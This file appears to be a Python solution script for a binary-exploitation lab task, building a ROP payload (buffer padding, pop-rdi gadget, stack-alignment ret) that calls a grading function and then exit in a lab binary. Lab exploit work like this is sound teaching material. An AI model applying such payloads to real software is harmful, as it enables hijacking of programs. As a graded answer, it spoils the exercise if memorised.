#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
from struct import pack

def p64(x):
    return pack("<Q", x)

pop_rdi_ret = 0x401a33
ret = 0x401a34
grade_eval = 0x401978
exit_plt = 0x4016e0

payload = b"A" * 16
payload += b"B" * 8

# 调用 grade_eval(4)
payload += p64(pop_rdi_ret)
payload += p64(4)
payload += p64(ret)          # 栈对齐
payload += p64(grade_eval)

# grade_eval 返回后调用 exit(0)
payload += p64(ret)
payload += p64(pop_rdi_ret)
payload += p64(0)
payload += p64(exit_plt)

sys.stdout.buffer.write(payload + b"\n")
